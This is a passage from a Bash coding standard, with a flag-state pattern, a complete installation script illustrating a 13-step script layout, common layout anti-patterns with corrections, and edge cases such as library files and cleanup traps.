  if ((INSTALL_BUILTIN)); then
    if ! build_builtin; then
      error 'Builtin build failed, disabling builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Execution phase: actions based on final flag state
  install_standalone
  ((INSTALL_BUILTIN)) && install_builtin ||: # Only runs if still enabled

  show_completion_message
}
```

**Pattern structure:**
1. Declare all boolean flags at the top with initial values
2. Parse command-line arguments, setting flags based on user input
3. Progressively adjust flags based on runtime conditions:
   - Dependency checks (disable if prerequisites missing)
   - Build/operation failures (disable dependent features)
   - User preferences override system defaults
4. Execute actions based on final flag state

**Real-world example - conditional builtin installation:**
```bash
# Initial state (defaults)
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# State progression through script lifecycle:

# 1. User input (--builtin flag)
INSTALL_BUILTIN=1
BUILTIN_REQUESTED=1

# 2. Override check (--no-builtin takes precedence)
((SKIP_BUILTIN)) && INSTALL_BUILTIN=0 ||:

# 3. Dependency check (no bash-builtins package)
if ! check_builtin_support; then
  if ((BUILTIN_REQUESTED)); then
    # Try to install, disable on failure
    install_bash_builtins || INSTALL_BUILTIN=0
  else
    # User didn't ask, just disable
    INSTALL_BUILTIN=0
  fi
fi

# 4. Build check (compilation failed)
((INSTALL_BUILTIN)) && ! build_builtin && INSTALL_BUILTIN=0

# 5. Final execution (only runs if INSTALL_BUILTIN=1)
((INSTALL_BUILTIN)) && install_builtin
```

**Benefits:**
- Clean separation between decision logic and action
- Easy to trace how flags change throughout execution
- Fail-safe behavior (disable features when prerequisites fail)
- User intent preserved (`BUILTIN_REQUESTED` tracks original request)
- Idempotent (same input → same state → same output)

**Guidelines:**
- Group related flags together (e.g., `INSTALL_*`, `SKIP_*`)
- Use separate flags for user intent vs. runtime state
- Document state transitions with comments
- Apply state changes in logical order (parse → validate → execute)
- Never modify flags during execution phase (only in setup/validation)

**Rationale:** This pattern allows scripts to adapt to runtime conditions while maintaining clarity about why decisions were made. It's especially useful for installation scripts where features may need to be disabled based on system capabilities or build failures.


---


**Rule: BCS????**

# Bash Coding Standard

This document defines a comprehensive Bash coding standard and presumes Bash 5.2 and higher; this is not a compatibility standard.

"This isn't just a coding standard -- it's a systems engineering philosophy applied to Bash." -- Biksu Okusi

## Coding Principles
- K.I.S.S.
- "The best process is no process"
- "Everything should be made as simple as possible, but not simpler."

NOTE: Do not over-engineer scripts; functions and variables not required for the operation of the script should not be included and/or removed.

## Contents
1. [Script Structure & Layout](#script-structure--layout)
2. [Variable Declarations & Constants](#variable-declarations--constants)
3. [Variable Expansion & Parameter Substitution](#variable-expansion--parameter-substitution)
4. [Quoting & String Literals](#quoting--string-literals)
5. [Arrays](#arrays)
6. [Functions](#functions)
7. [Control Flow](#control-flow)
8. [Error Handling](#error-handling)
9. [Input/Output & Messaging](#inputoutput--messaging)
10. [Command-Line Arguments](#command-line-arguments)
11. [File Operations](#file-operations)
12. [Security Considerations](#security-considerations)
13. [Code Style & Best Practices](#code-style--best-practices)
14. [Advanced Patterns](#advanced-patterns)

BSC00


---


**Rule: BCS0100**

# Script Structure & Layout

This section defines the mandatory 13-step structural layout that all Bash scripts must follow, ensuring consistency, maintainability, and safe initialization. It covers the complete organization from shebang through the final `#fin` marker, including script metadata, shopt settings, dual-purpose script patterns, FHS compliance for system integration, file extension guidelines, and the bottom-up function organization principle where low-level utilities are defined before high-level orchestration functions.


---


**Rule: BCS010101**

### Complete Working Example

**This subrule provides a comprehensive, production-quality installation script that demonstrates all 13 mandatory steps of the BCS0101 layout pattern in action.**

---

## Complete Example: All 13 Steps

This example demonstrates every step of the mandatory structure in a realistic installation script:

```bash
#!/bin/bash
#shellcheck disable=SC2034  # Some variables used by sourcing scripts
# Configurable installation script with dry-run mode and validation
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# ============================================================================
# Script Metadata
# ============================================================================

declare -r VERSION=2.1.420
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variable Declarations
# ============================================================================

# Configuration (can be modified by arguments)
declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp
declare -- SYSTEM_USER=myapp

# Derived paths (updated when PREFIX changes)
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- SHARE_DIR="$PREFIX"/share
declare -- CONFIG_DIR=/etc/"$APP_NAME"
declare -- LOG_DIR=/var/log/"$APP_NAME"

# Runtime flags
declare -i DRY_RUN=0
declare -i FORCE=0
declare -i INSTALL_SYSTEMD=0

# Accumulation arrays
declare -a WARNINGS=()
declare -a INSTALLED_FILES=()

# ============================================================================
# Step 8: Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD=$'\033[1m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi

# ============================================================================
# Step 9: Utility Functions
# Requires Color Definitions, and globals VERBOSE DEBUG PROMPT SCRIPT_NAME
# Upon script maturity, remove those functions not actually required by script.
# ============================================================================
declare -i VERBOSE=1
#declare -i DEBUG=0 PROMPT=1

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
#    debug)   prefix+=" ${CYAN}DEBUG${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
#debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
# Yes/no prompt
yn() {
  #((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
noarg() { (($# > 1)) || die 22 "Option ${1@Q} requires an argument"; }

# ============================================================================
# Step 10: Business Logic Functions
# ============================================================================

# Update derived paths when PREFIX or APP_NAME changes
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share

  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
}

show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Installation script

Configurable installation script with dry-run mode.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -p, --prefix DIR       Installation prefix (default: /usr/local)
  -u, --user USER        System user for service (default: myapp)
  -n, --dry-run          Show what would be done without doing it
  -f, --force            Overwrite existing files
  -s, --systemd          Install systemd service unit
  -v, --verbose          Enable verbose output
  -q, --quiet            Disable verbose output
  -h, --help             Display this help message
  -V, --version          Display version information

Examples:
  # Dry-run installation to /opt
  $SCRIPT_NAME --prefix /opt --dry-run

  # Install with systemd service
  $SCRIPT_NAME --systemd --user webapp

  # Force reinstall to default location
  $SCRIPT_NAME --force
EOT
}

check_prerequisites() {
  local -i missing=0
  local -- cmd

  for cmd in install mkdir chmod chown; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found ${cmd@Q}"
      missing=1
    fi
  done

  if ((INSTALL_SYSTEMD)) && ! command -v systemctl >/dev/null 2>&1; then
    error 'systemd installation requested but systemctl not found'
    missing=1
  fi

  ((missing==0)) || die 1 'Missing required commands'
  success 'All prerequisites satisfied'
}

validate_config() {
  # Validate PREFIX
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ "$PREFIX" =~ [[:space:]] ]] && \
      die 22 "PREFIX cannot contain spaces ${PREFIX@Q}"

  # Validate APP_NAME
  [[ -n "$APP_NAME" ]] || die 22 'APP_NAME cannot be empty'
  [[ "$APP_NAME" =~ ^[a-z][a-z0-9_-]*$ ]] || \
      die 22 'Invalid APP_NAME: must start with letter, contain only lowercase, digits, dash, underscore'

  # Validate SYSTEM_USER
  [[ -n "$SYSTEM_USER" ]] || \
      die 22 'SYSTEM_USER cannot be empty'

  # Check write permissions
  if [[ ! -d "$PREFIX" ]]; then
    if ((FORCE)) || yn "Create PREFIX directory ${PREFIX@Q}?"; then
      vecho "Will create ${PREFIX@Q}"
    else
      die 1 'Installation cancelled'
    fi
  fi

  success 'Configuration validated'
}

create_directories() {
  local -- dir

  for dir in "$BIN_DIR" "$LIB_DIR" "$SHARE_DIR" "$CONFIG_DIR" "$LOG_DIR"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create directory ${dir@Q}"
      continue
    fi

    if [[ -d "$dir" ]]; then
      vecho "Directory exists ${dir@Q}"
    else
      mkdir -p "$dir" || die 1 "Failed to create directory ${dir@Q}"
      success "Created directory ${dir@Q}"
    fi
  done
}

install_binaries() {
  local -- source="$SCRIPT_DIR"/bin
  local -- target=$BIN_DIR

  [[ -d "$source" ]] || die 2 "Source directory not found ${source@Q}"

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would install binaries from ${source@Q} to ${target@Q}"
    return 0
  }

  local -- file basename target_file
  local -i count=0
  for file in "$source"/*; do
    [[ -f "$file" ]] || continue

    basename=${file##*/}
    target_file="$target/$basename"

    if [[ -f "$target_file" ]] && ! ((FORCE)); then
      warn "File exists (use --force to overwrite) ${target_file@Q}"
      continue
    fi

    install -m 755 "$file" "$target_file" || \
        die 1 "Failed to install ${basename@Q}"
    INSTALLED_FILES+=("$target_file")
    count+=1
    vecho "Installed ${target_file@Q}"
  done

  success "Installed $count binaries to ${target@Q}"
}

install_libraries() {
  local -- source="$SCRIPT_DIR"/lib
  local -- target="$LIB_DIR"/"$APP_NAME"

  [[ -d "$source" ]] || {
    vecho 'No libraries to install'
    return 0
  }

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would install libraries from ${source@Q} to ${target@Q}"
    return 0
  }

  mkdir -p "$target" || die 1 "Failed to create library directory ${target@Q}"

  cp -r "$source"/* "$target"/ || die 1 'Library installation failed'
  chmod -R a+rX "$target"

  success "Installed libraries to ${target@Q}"
}

generate_config() {
  local -- config_file="$CONFIG_DIR"/"$APP_NAME".conf

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would generate config ${config_file@Q}"
    return 0
  }

  if [[ -f "$config_file" ]] && ! ((FORCE)); then
    warn "Config file exists (use --force to overwrite) ${config_file@Q}"
    return 0
  fi

  cat > "$config_file" <<EOT
# $APP_NAME configuration
# Generated by $SCRIPT_NAME $VERSION on $(date -u +%Y-%m-%d)

[installation]
prefix = $PREFIX
version = $VERSION
install_date = $(date -u +%Y-%m-%dT%H:%M:%SZ)

[paths]
bin_dir = $BIN_DIR
lib_dir = $LIB_DIR
config_dir = $CONFIG_DIR
log_dir = $LOG_DIR

[runtime]
user = $SYSTEM_USER
log_level = INFO
EOT

  chmod 644 "$config_file"
  success "Generated config ${config_file@Q}"
}

install_systemd_unit() {
  ((INSTALL_SYSTEMD)) || return 0

  local -- unit_file=/etc/systemd/system/"$APP_NAME".service

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install systemd unit ${unit_file@Q}"
    return 0
  fi

  cat > "$unit_file" <<EOT
[Unit]
Description=$APP_NAME Service
After=network.target

[Service]
Type=simple
User=$SYSTEM_USER
ExecStart=$BIN_DIR/$APP_NAME
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
EOT

  chmod 644 "$unit_file"
  systemctl daemon-reload || warn 'Failed to reload systemd daemon'

  success "Installed systemd unit ${unit_file@Q}"
}

set_permissions() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would set directory permissions'
    return 0
  fi

  # Log directory should be writable by system user
  if id "$SYSTEM_USER" >/dev/null 2>&1; then
    chown -R "$SYSTEM_USER":"$SYSTEM_USER" "$LOG_DIR" 2>/dev/null || \
      warn "Failed to set ownership on ${LOG_DIR@Q} (may need sudo)"
  else
    warn "System user ${SYSTEM_USER@Q} does not exist - skipping ownership changes"
  fi

  success 'Permissions configured'
}

show_summary() {
  cat <<EOT

${BOLD}Installation Summary${NC}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Application:    $APP_NAME
  Version:        $VERSION
  Prefix:         $PREFIX
  System User:    $SYSTEM_USER

  Directories:
    Binaries:     $BIN_DIR
    Libraries:    $LIB_DIR
    Config:       $CONFIG_DIR
    Logs:         $LOG_DIR

  Files Installed: ${#INSTALLED_FILES[@]}
  Warnings:        ${#WARNINGS[@]}

EOT

  if ((${#WARNINGS[@]})); then
    echo "${YELLOW}Warnings:${NC}"
    local -- warning
    for warning in "${WARNINGS[@]}"; do
      echo "  • $warning"
    done
    echo
  fi

  if ((DRY_RUN)); then
    echo "${CYAN}This was a DRY-RUN - no changes were made${NC}"
  fi
}

# ============================================================================
# Step 11: main() Function
# ============================================================================

main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"
                     shift
                     PREFIX=$1
                     update_derived_paths
                     ;;

      -u|--user)     noarg "$@"
                     shift
                     SYSTEM_USER=$1
                     ;;

      -n|--dry-run)  DRY_RUN=1 ;;
      -f|--force)    FORCE=1 ;;
      -s|--systemd)  INSTALL_SYSTEMD=1 ;;

      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;

      -V|--version)  echo "$SCRIPT_NAME $VERSION"
                     return 0
                     ;;
      -h|--help)     show_help
                     return 0
                     ;;

      -[punfsvqVh]*) #shellcheck disable=SC2046 #split up single options
                     set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;

      -*)            die 22 "Invalid option ${1@Q} (use --help for usage)" ;;
      *)             die 2  "Unexpected argument ${1@Q}" ;;
    esac
    shift
  done

  # Make configuration readonly after argument parsing
  readonly -- PREFIX APP_NAME SYSTEM_USER
  readonly -- BIN_DIR LIB_DIR SHARE_DIR CONFIG_DIR LOG_DIR
  readonly -i VERBOSE DRY_RUN FORCE INSTALL_SYSTEMD

  # Show mode information
  ((DRY_RUN==0)) || info 'DRY-RUN mode enabled - no changes will be made'
  ((VERBOSE==0)) || info 'Verbose mode enabled'
  ((FORCE==0))   || info 'Force mode enabled - will overwrite existing files'

  # Execute installation workflow
  info "Installing $APP_NAME $VERSION to ${PREFIX@Q}"

  check_prerequisites
  validate_config
  create_directories
  install_binaries
  install_libraries
  generate_config
  install_systemd_unit
  set_permissions

  show_summary

  if ((DRY_RUN)); then
    info 'Dry-run complete - review output and run without --dry-run to install'
  else
    success "Installation of $APP_NAME $VERSION complete!"
  fi
}

# ============================================================================
# Step 12: Script Invocation
# ============================================================================

main "$@"

# ============================================================================
# Step 13: End Marker
# ============================================================================

#fin
```

---

## What This Example Demonstrates

### Structural Elements

1. **Complete initialization sequence** - Shebang, shellcheck, description, strict mode, shopt
2. **Comprehensive metadata** - Version, paths, script name (all readonly)
3. **Organized global variables** - Configuration, runtime flags, arrays
4. **Terminal-aware colors** - Conditional color codes based on TTY
5. **Standard messaging functions** - Complete `_msg()` system with all helpers
6. **Business logic hierarchy** - From validation to installation to summary
7. **Argument parsing with short options** - Full getopt-style handling
8. **Progressive readonly** - Variables become immutable after parsing

### Functional Patterns

**Dry-run mode throughout:** Every operation checks `DRY_RUN` flag and shows what would happen without executing.

**Force mode handling:** Existing files trigger warnings unless `--force` specified.

**Derived paths pattern:** When `PREFIX` changes, all dependent paths update via `update_derived_paths()`.

**Validation before action:** Prerequisites and configuration validated before any filesystem operations.

**Error accumulation:** Warnings collected in array for final summary.

**User prompts:** Interactive confirmation with `yn()` function when needed.

**Systemd integration:** Conditional service installation with proper unit file generation.

### Production Readiness

- Complete help and usage text
- Version information
- Verbose/quiet modes
- Configuration file generation
- Permission management
- Summary report
- Graceful error handling throughout
- All 13 mandatory steps correctly implemented

This example serves as a template for production installation scripts and demonstrates how all BCS principles work together in a real-world scenario.


---


**Rule: BCS010102**

### Common Layout Anti-Patterns

**This subrule demonstrates common violations of the BCS0101 13-step layout pattern, showing both the incorrect approach and the correct solution for each.**

---

## Anti-Patterns

### ✗ Wrong: Missing `set -euo pipefail`

```bash
#!/usr/bin/env bash

# Script starts without error handling
VERSION=1.0.0

# Commands can fail silently
rm -rf /important/data
cp config.txt /etc/
```

**Problem:** Errors are not caught, script continues executing after failures, leading to silent corruption or incomplete operations.

### ✓ Correct: Error Handling First

```bash
#!/usr/bin/env bash

# Installation script with proper safeguards

set -euo pipefail

shopt -s inherit_errexit shift_verbose

declare -r VERSION=1.0.0
# ... rest of script
```

---

### ✗ Wrong: Declaring Variables After Use

```bash
#!/usr/bin/env bash
set -euo pipefail

main() {
  # Using VERBOSE before it's declared
  ((VERBOSE)) && echo 'Starting...' ||:

  process_files
}

# Variables declared after main()
declare -i VERBOSE=0

main "$@"
#fin
```

**Problem:** Variables are referenced before they're declared, leading to "unbound variable" errors with `set -u`.

### ✓ Correct: Declare Before Use

```bash
#!/usr/bin/env bash
set -euo pipefail

# Declare all globals up front
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Now safe to use
  ((VERBOSE)) && echo 'Starting...' ||:

  process_files
}

main "$@"
#fin
```

---

### ✗ Wrong: Business Logic Before Utilities

```bash
#!/usr/bin/env bash
set -euo pipefail

# Business logic defined first
process_files() {
  local -- file
  for file in *.txt; do
    # Calling die() which isn't defined yet!
    [[ -f "$file" ]] || die 2 "Not a file ${file@Q}"
    echo "Processing ${file@Q}"
  done
}

# Utilities defined after business logic
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

main() {
  process_files
  : ...
}

main "$@"
#fin
```

**Problem:** `process_files()` calls `die()` which isn't defined yet. This works in bash (functions are resolved at runtime) but violates the principle of bottom-up organization and makes code harder to understand.

### ✓ Correct: Utilities Before Business Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

# Utilities first
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Business logic can safely call utilities
process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file ${file@Q}"
    echo "Processing ${file@Q}"
  done
}

main() {
  process_files
}

main "$@"
#fin
```

---

### ✗ Wrong: No `main()` Function in Large Script

`set -euo pipefail` must be placed before the start of the first line of executing code.

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

# ... 200 lines of functions ...

# Argument parsing scattered throughout
if [[ "$1" == '--help' ]]; then
  echo 'Usage: ...'
  exit 0
fi

# Business logic runs directly
check_prerequisites
validate_config
install_files

echo 'Done'
#fin
```

**Problem:** No clear entry point, argument parsing is scattered, can't easily test the script, can't source it to test individual functions.

### ✓ Correct: Use `main()` for Scripts Over 40 Lines

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

# ... 200 lines of functions ...

main() {
  # Centralized argument parsing
  while (($#)); do
    case $1 in
      -h|--help) show_help; exit 0 ;;
      *) die 22 "Invalid argument ${1@Q}" ;;
    esac
    shift
  done

  # Clear execution flow
  check_prerequisites
  validate_config
  install_files

  success 'Installation complete'
}

main "$@"
#fin
```

---

### ✗ Wrong: Missing End Marker

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

main() {
  echo 'Hello, World!'
}

main "$@"
# File ends without #fin or #end
```

**Problem:** No visual confirmation that file is complete, harder to detect truncated files.

### ✓ Correct: Always End With `#fin`

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

main() {
  echo 'Hello, World!'
}

main "$@"
#fin
```

---

### ✗ Wrong: Readonly Before Parsing Arguments

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
declare -r PREFIX=/usr/local

# Made readonly too early!
readonly -- VERSION PREFIX

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        # This will fail - PREFIX is readonly!
        PREFIX=$1
        ;;
    esac
    shift
  done
}

main "$@"
#fin
```

**Problem:** Variables that need to be modified during argument parsing are made readonly too early.

### ✓ Correct: Readonly After Argument Parsing

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- PREFIX=/usr/local  # Will be modified during parsing

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        PREFIX=$1  # OK - not readonly yet
        ;;
    esac
    shift
  done

  # Now make readonly after parsing complete
  readonly -- PREFIX

  # Rest of logic...
}

main "$@"
#fin
```

---

### ✗ Wrong: Mixing Declaration and Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

# Some globals
declare -i VERBOSE=0

# Function in the middle
check_something() {
  echo 'Checking...'
}

# More globals after function
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''

main() {
  check_something
}

main "$@"
#fin
```

**Problem:** Globals are scattered throughout the file, making it hard to see all state variables at once.

### ✓ Correct: All Globals Together

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

# All globals in one place
declare -i VERBOSE=0
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''

# All functions after globals
check_something() {
  echo 'Checking...'
}

main() {
  check_something
}

main "$@"
#fin
```

---

### ✗ Wrong: Sourcing Without Protecting Execution

```bash
#!/usr/bin/env bash
# This file is meant to be sourced, but...

set -euo pipefail  # Modifies caller's shell!!

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Runs automatically when sourced!
main "$@"
#fin
```

**Problem:** When sourced, this modifies the caller's shell settings and runs `main` automatically.

### ✓ Correct: Dual-Purpose Script

```bash
#!/usr/bin/env bash
# Only set strict mode when executed (not sourced)

error() { >&2 echo "ERROR: $*"; }

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Only run main when executed (not sourced)
# Fast exit if sourced
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Now start main script
set -euo pipefail

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

: ...

main() {
  echo 'Running main'
  : ...
}

main "$@"
#fin
```

---

## Summary

These eight anti-patterns represent the most common violations of the BCS0101 13-step layout:

1. **Missing strict mode** - Scripts without `set -euo pipefail` fail silently
2. **Declaration order** - Variables must be declared before use
3. **Function organization** - Utilities must come before business logic
4. **Missing main()** - Large scripts need structured entry point
5. **Missing end marker** - Scripts must end with `#fin` or `#end`
6. **Premature readonly** - Variables that change must not be readonly until after parsing
7. **Scattered declarations** - All globals must be grouped together
8. **Unprotected sourcing** - Dual-purpose scripts must protect execution code

Following the correct patterns ensures scripts are safe, maintainable, and predictable. Each violation leads to specific classes of bugs that are completely preventable through proper structure.


---


**Rule: BCS010103**

### Edge Cases and Variations

**This subrule covers special scenarios where the standard 13-step BCS0101 layout may be modified or simplified for specific use cases.**

---

## Edge Cases and Variations

### When to Skip `main()` Function

**Small scripts under 200 lines** can skip `main()` and run directly:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Simple file counter - only 20 lines total
declare -i count=0

for file in "$@"; do
  [[ ! -f "$file" ]] || count+=1
done

echo "Found $count files"
#fin
```

**Rationale:** The overhead of `main()` isn't justified for trivial scripts.

### Sourced Library Files

**Files meant only to be sourced** can skip execution parts:

```bash
#!/usr/bin/env bash
# Library of utility functions - meant to be sourced, not executed

# Don't use set -e when sourced (would affect caller)
# Don't make variables readonly (caller might need to modify)

is_integer() { [[ "$1" =~ ^-?[0-9]+$ ]]; }

is_valid_email() { [[ "$1" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; }

# No main(), no execution
# Just function definitions for other scripts to use
#fin
```

### Scripts With External Configuration

**When sourcing config files**, structure might include:

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
: ...

# Default configuration
declare -- CONFIG_FILE="${XDG_CONFIG_HOME:-$HOME/.config}"/myapp/config.sh
declare -- DATA_DIR="${XDG_DATA_HOME:-$HOME/.local/share}"/myapp

# Source config file if it exists and can be read
if [[ -r "$CONFIG_FILE" ]]; then
  #shellcheck source=/dev/null
  source "$CONFIG_FILE" || die 1 "Failed to source config ${CONFIG_FILE@Q}"
fi

# Now make readonly after sourcing config
readonly -- CONFIG_FILE DATA_DIR

# ... rest of script
```

### Platform-Specific Sections

**When handling multiple platforms:**

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
: ...

# Detect platform
declare -- PLATFORM
case $(uname -s) in
  Darwin) PLATFORM=macos ;;
  Linux)  PLATFORM=linux ;;
  *)      PLATFORM=unknown ;;
esac
readonly -- PLATFORM

# Platform-specific global variables
case $PLATFORM in
  macos)
    declare -- PACKAGE_MANAGER=brew
    declare -- INSTALL_CMD='brew install'
    ;;
  linux)
    declare -- PACKAGE_MANAGER=apt
    declare -- INSTALL_CMD='apt-get install'
    ;;
  *)
    die 1 "Unsupported platform ${PLATFORM@Q}"
    ;;
esac

readonly -- PACKAGE_MANAGER INSTALL_CMD

: ... rest of script
```

### Scripts With Cleanup Requirements

**When trap handlers are needed:**

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
: ...

# Temporary files array for cleanup
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=${1:-$?}
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    [[ ! -f "$file" ]] || rm -f "$file"
  done

  return "$exit_code"
}

# Set trap early, after functions are defined
trap 'cleanup $?' SIGINT SIGTERM EXIT

# ... rest of script uses TEMP_FILES
```

**Trap should be set** after cleanup function is defined but before any code that creates temp files.

---

## When to Deviate from Standard Layout

The 13-step layout is **strongly recommended** for all scripts, but these edge cases represent legitimate exceptions:

### Simplifications
- **Tiny scripts (<200 lines)** - Skip `main()`, run code directly
- **Library files** - Skip `set -e`, `main()`, script invocation
- **One-off utilities** - May skip color definitions, verbose messaging

### Extensions
- **External configuration** - Add config sourcing between metadata and business logic
- **Platform detection** - Add platform-specific globals after standard globals
- **Cleanup traps** - Add trap setup after utility functions but before business logic
- **Logging setup** - May add log file initialization after metadata
- **Lock files** - Add lock acquisition/release around main execution

### Key Principles

Even when deviating, maintain these principles:

1. **Safety first** - `set -euo pipefail` still comes first (unless library file)
2. **Dependencies before usage** - Bottom-up organization still applies
3. **Clear structure** - Readers should easily understand the flow
4. **Minimal deviation** - Only deviate when there's clear benefit
5. **Document reasons** - Comment why you're deviating from standard

### Examples of Inappropriate Deviation

**Don't do this:**
```bash
# ✗ Wrong - arbitrary reordering without reason
#!/usr/bin/env bash

# Functions before set -e
validate_input() { : ... }

set -euo pipefail  # Too late!

# Globals scattered
declare -r VERSION=1.0.0
check_system() { : ... }
declare -- PREFIX=/usr
```

**Instead:**
```bash
# ✓ Correct - standard order maintained
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
declare -- PREFIX=/usr

validate_input() { : ... }
check_system() { : ... }
```

---

## Summary

Edge cases exist for legitimate reasons:
- **Simplification** for tiny scripts that don't need full structure
- **Libraries** that shouldn't modify sourcing environment
- **External config** that must override defaults
- **Platform detection** for cross-platform compatibility
- **Cleanup traps** for resource management

But even with edge cases, the core principles remain:
- Error handling first
- Dependencies before usage
- Clear, predictable structure

Deviate only when necessary, and always maintain the spirit of the standard: **safety, clarity, and maintainability**.


---


**Rule: BCS0101**

## General Layouts for Standard Script

**All Bash scripts should ideally follow a specific 13-step structural layout that ensures consistency, maintainability, and correctness. This bottom-up organizational pattern places low-level utilities before high-level orchestration, allowing each component to safely call previously defined functions. The structure is mandatory for all scripts and ensures that error handling, metadata, dependencies, and execution flow are properly established before any business logic runs.**

For detailed examples, anti-patterns, and edge cases, see:
- **BCS010101** - Complete working example (462-line installation script)
- **BCS010102** - Common anti-patterns and corrections
- **BCS010103** - Edge cases and variations

---

## Rationale

**Why enforce a strict 13-step layout?**

1. **Predictability** - Developers (and AI assistants) know exactly where to find specific components in any script. Metadata is always in step 6, utilities in step 9, business logic in step 10, orchestration in step 11.

2. **Safe Initialization** - The ordering ensures that critical infrastructure is established before it's needed: error handling (`set -euo pipefail`) is configured before any commands run, metadata is available before any function executes, and global variables are declared before any code references them.

3. **Bottom-Up Dependency Resolution** - Lower-level components are defined before higher-level ones that depend on them. Messaging functions come before business logic that calls them, business logic comes before `main()` that orchestrates it. Each function can safely call any function defined above it.

4. **Testing and Maintenance** - Consistent structure makes scripts easier to test, debug, and maintain. You can source a script to test individual functions, extract utilities for reuse, or understand unfamiliar code quickly because the structure is standardized.

5. **Error Prevention** - The strict ordering prevents entire classes of errors: using undefined functions, referencing uninitialized variables, or running business logic before error handling is configured. Many subtle bugs are prevented by structure alone.

6. **Documentation Through Structure** - The layout itself documents the script's organization. The progression from infrastructure (steps 1-8) through implementation (steps 9-10) to orchestration (steps 11-12) tells the story of how the script works.

7. **Production Readiness** - The structure includes all elements needed for production scripts: version tracking, proper error handling, terminal detection for output, argument validation, and clear execution flow. Nothing is left to chance.

---
